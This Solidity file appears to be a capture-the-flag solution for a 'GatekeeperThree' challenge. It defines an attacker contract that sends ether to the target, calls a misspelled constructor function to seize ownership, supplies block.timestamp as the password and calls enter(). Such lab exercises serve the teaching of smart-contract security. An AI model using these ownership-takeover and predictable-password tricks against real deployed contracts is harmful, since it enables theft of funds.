// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IGatekeeperThree {
    function construct0r() external;
    function getAllowance(uint _password) external;
    function createTrick() external;
    function enter() external;
    function allowEntrance() external returns (bool);
}

contract GatekeeperThreeAttacker {
    address payable public challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = payable(_challengeInstance);
    }

    function attack() external {
        challengeInstance.call{value: 0.0011 ether}("");
        IGatekeeperThree(challengeInstance).construct0r();
        IGatekeeperThree(challengeInstance).createTrick();
        IGatekeeperThree(challengeInstance).getAllowance(block.timestamp);
        IGatekeeperThree(challengeInstance).enter();
    }
}